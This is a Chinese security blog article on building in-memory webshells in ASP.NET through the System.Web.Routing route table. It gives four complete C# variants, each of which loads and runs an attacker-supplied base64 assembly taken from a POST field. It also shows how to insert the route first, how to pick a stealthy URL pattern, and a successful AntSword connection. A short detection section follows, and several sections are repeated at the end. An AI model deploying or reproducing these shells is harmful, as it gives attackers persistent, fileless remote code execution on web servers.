# ASP.NET下的内存马(二)：Route内存马的N种写法

<meta name="referrer" content="no-referrer" />

本文首发于[ASP.NET下的内存马(2) Route内存马 - 跳跳糖 (tttang.com)](https://tttang.com/archive/1420/)

## 前言

asp.net下的内存马研究文章比较少，目前提到过的包括虚拟路径内存马以及HttpListener内存马。最近研究了一下其他类型的内存马，发现.net可以利用的地方要多得多。所以准备写个系列文章，讲一讲asp.net下的内存马。



**文章仅作研究性质，不保证任何实战效果，请勿用于非法用途。**



上篇讲了asp.net mvc下的filter内存马，必须依赖于system.web.mvc.dll这个东西，也就是只能在.net mvc下使用。那么如何仅利用.net framework里面的dll来实现新的内存马呢。这就引出了今天要讲的route内存马。

## System.Web.Routing

[System.Web.Routing](https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing?view=netframework-3.5)这个类最早出现在.net 3.5，主要用于在 ASP.NET 应用程序中处理路由。

微软文档介绍：

```cpp
Route类使你可以指定如何在 ASP.NET 应用程序中处理路由。 你 Route 为要映射到的每个 URL 模式创建一个对象，该对象可以处理与该模式对应的请求。 然后，将路由添加到 Routes 集合。 当应用程序收到请求时，ASP.NET 路由会循环访问集合中的路由， Routes 以查找第一个与 URL 模式匹配的路由。

将 Url 属性设置为 URL 模式。 URL 模式由传入 HTTP 请求中的应用程序名称后面的段组成。 例如，在 URL 中 http://www.contoso.com/products/show/beverages ，模式适用于 products/show/beverages 。 具有三个段（如）的模式 {controller}/{action}/{id} 与 URL 匹配 http://www.contoso.com/products/show/beverages 。 每个段均由 / 字符分隔。 当段括在大括号中 ({ 和 }) 时，段会被称为 URL 参数。 ASP.NET 路由从请求中检索值并将其分配给 URL 参数。 在上面的示例中，将为 URL 参数 action 分配值 show 。 如果段未括在大括号中，则该值将被视为文本值。

将 Defaults 属性设置为一个 RouteValueDictionary 对象，该对象包含在 url 缺少参数时使用的值，或者设置未在 url 中参数化的其他值。 将 Constraints 属性设置为 RouteValueDictionary 包含正则表达式或对象的值的对象 IRouteConstraint 。 这些值用于确定参数值是否有效。
```

如果我们能够动态打进去一个路由，然后映射到我们自定义的类，即可实现内存马的效果。

## Route内存马

那么如何添加呢？我们上一篇文章看到了在mvc中是存在一个GlobalFilters.Filters来存放filter，第二个RouteTable.Routes便是存放全局route的collection。

```cpp
    public class MvcApplication : System.Web.HttpApplication
    {
        protected void Application_Start()
        {
            AreaRegistration.RegisterAllAreas();
            FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);
            RouteConfig.RegisterRoutes(RouteTable.Routes);
            BundleConfig.RegisterBundles(BundleTable.Bundles);
        }
    }
```

这里提一嘴为啥不能直接用mvc下面的RouteConfig.RegisterRoutes来注册route

点进函数可以看到调用了System.Web.Mvc.RouteCollectionExtensions.MapRoute方法，而这个方法也是要依赖System.Web.Mvc.dll的。所以不能直接拿来用。

```cpp
    public class RouteConfig
    {
        public static void RegisterRoutes(RouteCollection routes)
        {
            routes.IgnoreRoute("{resource}.axd/{*pathInfo}");
            routes.MapRoute(
                name: "Default",
                url: "{controller}/{action}/{id}",
                defaults: new { controller = "Home", action = "Index", id = UrlParameter.Optional }
            );
        }
    }
```

一路寻找重载，发现实际上就是给RouteTable.Routes里面增加了一个元素，我们直接调用route.Add即可。



![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640438484998-059c87c9-169a-4ae5-82e5-3e57a11ea3b5.png)

System.Web.Routing.RouteCollection.Add第一个参数是名字，不过没有太大用处，只是为了判断map里面有没有重复的。第二个参数是重点，要打进去一个RouteBase类型的item。RouteBase是个抽象类，默认的实现为System.Web.Routing.Route。

这里就有不同的操作方式了，第一种是自己实现一个RouteBase，第二种是new一个System.Web.Routing.Route对象。

### 自己实现RouteBase

继承RouteBase需要实现两个方法：

| GetRouteData(HttpContextBase)                        | 在派生类中重写时，返回关于请求的路由信息。                   |
| ---------------------------------------------------- | ------------------------------------------------------------ |
| GetVirtualPath(RequestContext, RouteValueDictionary) | 在派生类中重写时，检查路由是否与指定的值匹配，如果匹配，则生成 URL，并检索有关该路由的信息。 |

#### GetRouteData

这个点是目前来看最佳的注入点，beichen师傅在kcon的演讲中也是用的这个函数。改写GetRouteData方法，里面加入我们的shell逻辑即可。这里HttpContextBase是个抽象类，具体的实现是HttpContextWrapper，需要用到反射来获取我们需要的request跟response。

这里注意一定要加HttpResponse.End()，具体原因大家可以思考一下。

```cpp
public class MyRoute : RouteBase
    {
        public override RouteData GetRouteData(HttpContextBase httpContext)
        {
            String Payload = httpContext.Request.Form["ant"];
            if (Payload != null)
            {
                FieldInfo requestField =
                    typeof(HttpRequestWrapper).GetField("_httpRequest", BindingFlags.Instance | BindingFlags.NonPublic);
                HttpRequest httpRequest =
                    (HttpRequest)requestField.GetValue(httpContext.Request);

                FieldInfo responseField =
                    typeof(HttpResponseWrapper).GetField("_httpResponse",
                        BindingFlags.Instance | BindingFlags.NonPublic);
                HttpResponse httpResponse =
                    (HttpResponse)responseField.GetValue(httpContext.Response);
                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(new object[] { httpRequest, httpResponse });
                httpResponse.End();
            }
            return null;
        }

        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
        {
            return null;
        }
    }
```

更简单的一种做法是直接用HttpContext.Current就获取当前的Context对象，传入Equals里即可。

```cpp
 public class MyRoute : RouteBase
    {
        public override RouteData GetRouteData(HttpContextBase httpContext)
        {
        	HttpContext context = HttpContext.Current;
            String Payload = httpContext.Request.Form["ant"];
            if (Payload != null)
            {
                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);
                context.Response.End();
            }
            return null;
        }

        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
        {
            return null;
        }
    }
```

将我们的逻辑注入到GetRouteData函数中，这是第一种写法。

#### GetVirtualPath

其实用GetVirtualPath也是可以注入我们的逻辑的，这是第二种写法。

```cpp
public class MyRoute : RouteBase
    {
        public override RouteData GetRouteData(HttpContextBase httpContext)
        {
            return null;
        }

        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
        {
            HttpContext context = HttpContext.Current;
            String Payload = context.Request.Form["ant"];
            if (Payload != null)
            {
                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);
                context.Response.End();
            }
            return null;
        }
    }
```

#### 优先级

那么到底哪个函数会更先被调用呢？我在两个函数，以及Controller里分别加了一条打印的语句。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640524000533-4d4183a7-ff2b-472f-9584-bff72eddfcab.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640524014082-652f7178-5ee0-4370-bd51-265a843e0948.png)

发现顺序是 GetRouteData>Controller>GetVirtualPath，所以还是GetRouteData比较好用。

### 利用System.Web.Routing.Route

另一种做法就是沿着现有实现类Route的逻辑来走。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640441994513-2e0c4bed-e0fb-4e9c-bd0b-12c61249d2ed.png)

他的构造类需要两个参数，第一个是url pattern，第二个是对应的处理handler。

实现IRouteHandler接口需要实现GetHttpHandler方法，需要返回一个实现了IHttpHandler的handler

这里其实又有不同的操作了，内存马的本质是我们把恶意的代码注入到了一个每次Web请求都会触发的地方。

所以我们既可以在RouteHandler中添加恶意逻辑，也可以在实现的HttpHandler里加恶意逻辑。

#### 注入RouteHandler

```cpp
    public class MyRoute : IRouteHandler
    {
        public IHttpHandler GetHttpHandler(RequestContext requestContext)
        {
            HttpContext context = HttpContext.Current;
            String Payload = context.Request.Form["ant"];
            if (Payload != null)
            {
                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);
                context.Response.End();
            }
            return null;
        }
    }
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640525962375-05101896-5e09-4c3b-9062-134da6e3e5d2.png)

报错不影响连接，如果有强迫症可以实现一个空的IHttpHandler。

#### 注入HttpHandler

主要逻辑在ProcessRequest里，这是第四种写法

```cpp
public class MyRoute : IRouteHandler
    {
        public IHttpHandler GetHttpHandler(RequestContext requestContext)
        {
            return new Myhandler(requestContext);
        }
    }

    public class Myhandler : IHttpHandler

    {
        public RequestContext RequestContext { get; private set; }

        public Myhandler(RequestContext context)
        {
            this.RequestContext = context;
        }

        public void ProcessRequest(HttpContext context)
        {
            String Payload = context.Request.Form["ant"];
            if (Payload != null)
            {
                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);
                context.Response.End();
            }
            context.Response.End();
        }

        public bool IsReusable
        {
            get { return false; }
        }
    }
```

#### 路由问题

文档：https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route.url?view=netframework-3.5#System_Web_Routing_Route_Url

```cpp
将值分配给 Url 属性时，在 / 分析 URL 时，字符被解释为分隔符。 使用大括号 ({}) 来定义称为 URL 参数的变量。 将 URL 中的匹配段的值分配给 URL 参数。 Url未括在大括号中的属性中的任何值都将被视为文本常量。
?不允许在属性中使用该字符 Url 。 必须通过分隔符或文本常量分隔每个 URL 段。 可以将 {{ 或 }} 用作大括号字符的转义符。
```

用这种方式有一个问题，Route的URL默认没有正则，不能像java一样直接指定/*，但是可以用{xxx}来表示任意变量

在此为了不影响业务，我们选择一个只有自己知道的开头的字符串

```cpp
new Route("mr6{page}", new MyRoute())
```

这样任意/mr6xxxxx 都可以连接。

### 添加到第一位

跟mvc的filter不同的是，Route的add方法没有order参数的选项，所以依然要考虑如何把我们的shell添加到第一位的问题。

RouteCollection本质是个Collection，所以只需要调用Insert方法，并且指定位置为0即可把我们的shell添加到第一位。

```cpp
RouteCollection routes = RouteTable.Routes;
routes.Insert(0, (RouteBase)new MyRoute());
```

至此我们的内存马大业就算完成了。

## 测试

访问注入内存马的aspx，一片空白说明注入成功

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640526055957-542be082-0d6f-449b-a1bd-fe1a241da5f1.png)

蚁剑中输入任意url，连接成功。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640524070570-fdec514f-a08a-439d-bcf3-53012a96551a.png)

## 检测内存马

本人写了个小脚本 ASP.NET-Memshell-Scanner，可用于各类内存马的检测。

下载项目中的检测脚本 https://github.com/yzddmr6/ASP.NET-Memshell-Scanner/blob/master/aspx-memshell-scanner.aspx，放到网站目录下，浏览器访问。

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1642859344493-9bc0d20d-903e-414f-b409-dbd2c36da1c7.png)

其中id为1的是使用本文中实现RouteBase的方式注入的内存马，这种情况下Router Type为攻击者自己设置的类名，并且没有RouteHandler。

id为2的是使用本文中利用System.Web.Routing.Route注入的内存马，这种情况下Router Type为System.Web.Routing.Route，RouteHandler Type为攻击者自己设置的类名，并且存在URL路径。



实锤方法同上文，找到可疑Router的CodeBase文件，使用dnspy等反编译工具打开。

找到类名对应的文件，发现恶意代码，即可确认被注入了内存马。

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1642859768384-e0abba54-7909-4cfa-af60-fd2c4a8d8d2c.png)

## 参考

https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route?view=netframework-3.5

https://www.cnblogs.com/liangxiaofeng/p/5619866.html

https://www.programminghunter.com/article/8505151604/

[https://github.com/knownsec/KCon/blob/master/2021/%E9%AB%98%E7%BA%A7%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8B%E7%9A%84Webshell.pdf](https://github.com/knownsec/KCon/blob/master/2021/高级攻防演练下的Webshell.pdf)

https://mp.weixin.qq.com/s/cm8pPAw7dZ-iMb4LvVXAlQ

### 添加到第一位

跟mvc的filter不同的是，Route的add方法没有order参数的选项，所以依然要考虑如何把我们的shell添加到第一位的问题。

RouteCollection本质是个Collection，所以只需要调用Insert方法，并且指定位置为0即可把我们的shell添加到第一位。

```cpp
RouteCollection routes = RouteTable.Routes;
routes.Insert(0, (RouteBase)new MyRoute());
```

至此我们的内存马大业就算完成了。

## 测试

访问注入内存马的aspx，一片空白说明注入成功

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640526055957-542be082-0d6f-449b-a1bd-fe1a241da5f1.png)

蚁剑中输入任意url，连接成功。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640524070570-fdec514f-a08a-439d-bcf3-53012a96551a.png)

## 参考

https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route?view=netframework-3.5

https://www.cnblogs.com/liangxiaofeng/p/5619866.html

https://www.programminghunter.com/article/8505151604/

[https://github.com/knownsec/KCon/blob/master/2021/%E9%AB%98%E7%BA%A7%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8B%E7%9A%84Webshell.pdf](https://github.com/knownsec/KCon/blob/master/2021/高级攻防演练下的Webshell.pdf)

https://docs.microsoft.com/zh-cn/aspnet/mvc/overview/older-versions-1/controllers-and-routing/asp-net-mvc-routing-overview-vb
